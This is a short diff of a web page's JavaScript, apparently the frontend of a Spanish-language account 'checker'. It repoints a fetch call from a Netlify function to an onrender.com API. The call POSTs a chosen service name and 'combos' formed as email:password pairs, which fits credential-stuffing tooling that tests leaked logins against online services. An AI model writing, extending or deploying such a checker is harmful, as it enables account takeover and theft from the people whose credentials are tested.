@@ -56,7 +56,7 @@
             
             resultDiv.innerHTML = "Chequeando " + currentService + "... (puede tardar)";
             try {
-                const res = await fetch("https://fascinating-panda-466eb7.netlify.app/.netlify/functions/check", {
+                const res = await fetch("https://kanha-checker.onrender.com/api/check", {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ service: currentService, combos: [`${email}:${pass}`] })
